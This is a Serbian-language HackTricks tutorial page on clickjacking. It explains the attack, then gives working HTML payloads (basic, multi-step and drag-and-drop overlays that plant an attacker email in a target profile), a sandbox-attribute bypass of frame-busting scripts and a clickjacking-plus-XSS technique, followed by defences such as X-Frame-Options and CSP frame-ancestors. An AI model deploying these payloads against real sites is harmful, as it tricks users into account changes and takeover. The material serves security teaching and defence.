# Clickjacking

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomo캖 najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 맚a je Clickjacking

U clickjacking napadu, **korisnik** je **prevaran** da **klikne** na **element** na veb stranici koji je ili **nevidljiv** ili prikazan kao drugi element. Ova manipulacija mo쬰 dovesti do ne쬰ljenih posledica za korisnika, kao 코to su preuzimanje malvera, preusmeravanje na zlonamerne veb stranice, pru쬬nje pristupnih podataka ili osetljivih informacija, transfer novca ili online kupovina proizvoda.


### Trik za popunjavanje formi

Ponekad je mogu캖e **popuniti vrednost polja forme kori코캖enjem GET parametara prilikom u캜itavanja stranice**. Napada캜 mo쬰 iskoristiti ovu funkcionalnost da popuni formu sa proizvoljnim podacima i po코alje clickjacking payload tako da korisnik pritisne dugme Submit.

### Popunjavanje forme pomo캖u Drag\&Drop

Ako 쬰lite da korisnik **popuni formu** ali ne 쬰lite direktno da ga pitate da unese odre캠ene informacije (kao 코to su email ili specifi캜na lozinka koju znate), mo쬰te ga samo zamoliti da **prevu캜e i ispusti** ne코to 코to 캖e upisati va코e kontrolisane podatke kao u [**ovom primeru**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Osnovni Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Vi코ekorak Payload

Clickjacking napadi mogu se izvesti pomo캖u vi코ekorak payloada. Ova tehnika uklju캜uje kori코캖enje vi코e koraka kako bi se postigao ciljani rezultat. Evo nekoliko primera vi코ekorak payloada:

1. **Kliknite na nevidljivi element**: U ovom scenariju, korisnik je prevaren da klikne na nevidljivi element na stranici. Taj element mo쬰 biti postavljen iznad drugog elementa koji korisnik o캜ekuje da klikne. Kada korisnik klikne na nevidljivi element, zapravo izvr코ava akciju koju napada캜 쬰li.

2. **Kliknite na skriveni iframe**: Ovde se koristi skriveni iframe koji sadr쬴 ciljani sadr쬬j. Kada korisnik klikne na vidljivi element na stranici, zapravo klikne na skriveni iframe koji izvr코ava akciju koju napada캜 쬰li.

3. **Kliknite na preusmereni element**: U ovom slu캜aju, korisnik je preusmeren na drugu stranicu koja sadr쬴 ciljani sadr쬬j. Kada korisnik klikne na element na toj stranici, zapravo izvr코ava akciju koju napada캜 쬰li.

Da bi se izveo vi코ekorak payload, napada캜 mora pa쬷jivo planirati korake i osigurati da korisnik bude prevaren da klikne na odgovaraju캖e elemente. Ova tehnika mo쬰 biti vrlo efikasna u izvo캠enju clickjacking napada.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Klik payload

Ova tehnika clickjacking-a koristi kombinaciju funkcionalnosti prevla캜enja i ispu코tanja (drag\&drop) i klika kako bi se izvr코io payload. Osnovna ideja je da se korisnik navede da prevu캜e i ispusti neki element na ciljanoj stranici, ali se zapravo izvr코ava klik na drugi element koji je skriven ili je van vidokruga korisnika.

Da biste izvr코ili ovu tehniku, pratite slede캖e korake:

1. Identifikujte ciljani element na ciljanoj stranici na kojem 쬰lite da izvr코ite klik.
2. Napravite skriveni element na va코oj stranici koji 캖e biti prevu캜en i ispusten na ciljani element.
3. Postavite skriveni element preko ciljanog elementa koriste캖i CSS pozicioniranje.
4. Podesite doga캠aj prevla캜enja i ispu코tanja (drag\&drop) na skrivenom elementu.
5. Kada korisnik prevu캜e i ispusti skriveni element na ciljani element, izvr코i캖e se klik na ciljani element.

Ova tehnika mo쬰 biti korisna u situacijama kada ciljani element ima neku vrstu za코tite od direktnog klika ili kada 쬰lite da izvr코ite klik na element koji je van vidokruga korisnika.

Napomena: Kao i kod svih tehnika clickjacking-a, ova tehnika mo쬰 biti zloupotrebljena i koristiti se u nezakonite svrhe. Koristite je samo u okviru zakona i eti캜kih smernica.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Ako ste identifikovali **XSS napad koji zahteva da korisnik klikne** na neki element da bi **pokrenuo** XSS, a stranica je **ranjiva na clickjacking**, mo쬰te je zloupotrebiti da prevarite korisnika da klikne na dugme/link.\
Primer:\
_Prona코li ste **self XSS** u nekim privatnim detaljima naloga (detalji koje **samo vi mo쬰te postaviti i 캜itati**). Stranica sa **formom** za postavljanje ovih detalja je **ranjiva** na **Clickjacking** i mo쬰te **unapred popuniti** formu sa GET parametrima._\
\_\_Napada캜 mo쬰 pripremiti **Clickjacking** napad na tu stranicu **unapred popunjavaju캖i** formu sa **XSS payloadom** i **prevariti** korisnika da **po코alje** formu. Tako, **kada se forma po코alje** i vrednosti se promene, **korisnik 캖e izvr코iti XSS**.

## Strategije za smanjenje Clickjackinga

### Odbrane na klijentskoj strani

Skripte izvr코ene na klijentskoj strani mogu izvr코iti radnje kako bi spre캜ile Clickjacking:

* Osiguravanje da je prozor aplikacije glavni ili vrhovni prozor.
* U캜initi sve okvire vidljivim.
* Onemogu캖avanje klikova na nevidljive okvire.
* Otkrivanje i upozoravanje korisnika na potencijalne poku코aje Clickjackinga.

Me캠utim, ove skripte za prekid okvira mogu biti zaobi캠ene:

* **Sigurnosne postavke pregleda캜a:** Neki pregleda캜i mogu blokirati ove skripte na osnovu svojih sigurnosnih postavki ili nedostatka podr코ke za JavaScript.
* **HTML5 iframe `sandbox` atribut:** Napada캜 mo쬰 neutralisati skripte za prekid okvira postavljanjem `sandbox` atributa sa vrednostima `allow-forms` ili `allow-scripts` bez `allow-top-navigation`. Ovo spre캜ava iframe da proveri da li je vrhovni prozor, npr.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` i `allow-scripts` vrednosti omogu캖avaju radnje unutar iframe-a dok onemogu캖avaju navigaciju na vrhu. Da bi se osigurala 쬰ljena funkcionalnost ciljanog sajta, mogu biti potrebne dodatne dozvole poput `allow-same-origin` i `allow-modals`, u zavisnosti od vrste napada. Poruke u konzoli pregleda캜a mogu voditi ka tome koje dozvole treba omogu캖iti.

### Odbrana na serverskoj strani

#### X-Frame-Options

**`X-Frame-Options` HTTP odgovor zaglavlje** obave코tava pregleda캜e o legitimnosti prikazivanja stranice u `<frame>` ili `<iframe>`, poma쬿캖i u spre캜avanju Clickjacking-a:

* `X-Frame-Options: deny` - Nijedan domen ne mo쬰 okvirati sadr쬬j.
* `X-Frame-Options: sameorigin` - Samo trenutni sajt mo쬰 okvirati sadr쬬j.
* `X-Frame-Options: allow-from https://trusted.com` - Samo navedeni 'uri' mo쬰 okvirati stranicu.
* Napomena o ograni캜enjima: ako pregleda캜 ne podr쬬va ovu direktivu, mo쬯a ne캖e raditi. Neke pregleda캜i vi코e vole CSP frame-ancestors direktivu.

#### Content Security Policy (CSP) frame-ancestors direktiva

**`frame-ancestors` direktiva u CSP** je preporu캜eni metod za za코titu od Clickjacking-a:

* `frame-ancestors 'none'` - Sli캜no kao `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Sli캜no kao `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Sli캜no kao `X-Frame-Options: allow-from`.

Na primer, slede캖i CSP dozvoljava samo okviranje sa istog domena:

`Content-Security-Policy: frame-ancestors 'self';`

Detaljnije informacije i kompleksni primeri mogu se prona캖i u [frame-ancestors CSP dokumentaciji](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) i [Mozilla-inoj CSP frame-ancestors dokumentaciji](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) sa `child-src` i `frame-src`

**Content Security Policy (CSP)** je sigurnosna mera koja poma쬰 u spre캜avanju Clickjacking-a i drugih napada ubacivanjem koda, tako 코to defini코e izvore koje pregleda캜 treba da dozvoli za u캜itavanje sadr쬬ja.

#### Direktiva `frame-src`
- Defini코e validne izvore za okvire.
- Konkretnija od `default-src` direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava okvire sa istog porekla (self) i https://trusted-website.com.

#### Direktiva `child-src`
- Uvedena u CSP nivou 2 kako bi se postavili validni izvori za web radnike i okvire.
- Deluje kao rezervna opcija za frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava okvire i radnike sa istog porekla (self) i https://trusted-website.com.

**Napomene o kori코캖enju:**
- Zastarevanje: child-src se postepeno ukida u korist frame-src i worker-src.
- Rezervno pona코anje: Ako frame-src nedostaje, child-src se koristi kao rezervna opcija za okvire. Ako oba nedostaju, koristi se default-src.
- Stroga definicija izvora: Uklju캜ite samo pouzdane izvore u direktive kako biste spre캜ili zloupotrebu.

#### JavaScript skripte za prekid okvira

Iako nije potpuno neprobojno, JavaScript bazirane skripte za prekid okvira mogu se koristiti kako bi se spre캜ilo da se veb stranica okvira. Primer:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Kori코캖enje Anti-CSRF tokena

* **Provera tokena:** Koristite anti-CSRF tokene u veb aplikacijama kako biste osigurali da se zahtevi koji menjaju stanje naprave namerno od strane korisnika, a ne preko Clickjacked stranice.

## Reference

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
